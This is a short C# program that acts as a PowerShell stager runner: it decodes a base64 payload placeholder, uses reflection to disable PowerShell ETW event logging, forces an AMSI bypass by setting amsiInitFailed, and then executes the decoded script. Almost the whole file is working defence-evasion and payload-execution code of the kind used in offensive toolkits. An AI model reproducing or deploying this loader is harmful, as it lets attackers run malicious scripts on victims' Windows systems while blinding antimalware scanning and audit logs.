/*
 * 
 * You may compile this in Visual Studio or SharpDevelop etc.
 * 
 * 
 * 
 * 
 */
using System;
using System.Text;
using System.Reflection;
using System.Management.Automation; 
using System.Management.Automation.Runspaces; 

namespace cmd
{
	class Program
	{
		public static void Main(string[] args)
		{
            BindingFlags flags = BindingFlags.NonPublic | BindingFlags.Static;

			string stager = " YOUR CODE GOES HERE";
			var decodedScript = Encoding.Unicode.GetString(Convert.FromBase64String(stager));

            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();
            RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
            Pipeline pipeline = runspace.CreatePipeline();

            var PSEtwLogProvider = pipeline.Commands.GetType().Assembly.GetType("System.Management.Automation.Tracing.PSEtwLogProvider");
            if (PSEtwLogProvider != null)
            {
                var EtwProvider = PSEtwLogProvider.GetField("etwProvider", flags);
                var EventProvider = new System.Diagnostics.Eventing.EventProvider(Guid.NewGuid());
                EtwProvider.SetValue(null, EventProvider);
            }

            var amsiUtils = pipeline.Commands.GetType().Assembly.GetType("System.Management.Automation.AmsiUtils");
            if (amsiUtils != null)
            {
                amsiUtils.GetField("amsiInitFailed", flags).SetValue(null, true);
            }

            pipeline.Commands.AddScript(decodedScript);

            pipeline.Commands.Add("Out-Default");
            pipeline.Invoke();

        }
	}
}
